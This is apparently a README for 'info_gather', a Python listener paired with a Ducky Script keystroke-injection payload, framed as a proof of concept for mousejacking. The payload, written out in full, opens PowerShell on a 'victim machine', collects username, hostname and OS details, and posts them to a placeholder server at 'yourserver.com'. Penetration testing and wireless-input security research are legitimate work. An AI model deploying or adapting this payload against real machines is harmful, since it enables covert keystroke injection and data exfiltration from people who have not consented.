# info_gather
Gather Windows Info for POC. A good use case is mousejacking

Run the server and any port using:

```
python3 info_gather.py 80
```

On the victim machine use a Ducky Script to send the info to the server host:

```
DELAY 2000
GUI r
DELAY 500
STRING powershell.exe
DELAY 500
ENTER
DELAY 500
STRING $username = $env:username;$hostname = hostname;$os = (Get-CimInstance Win32_OperatingSystem).Caption;$data = @{'username' = $username;'hostname' = $hostname;'os' = $os};$json = $data | ConvertTo-Json;Invoke-RestMethod -Method Post -Uri "http://yourserver.com" -Body $json -ContentType "application/json"
DELAY 500
ENTER
```
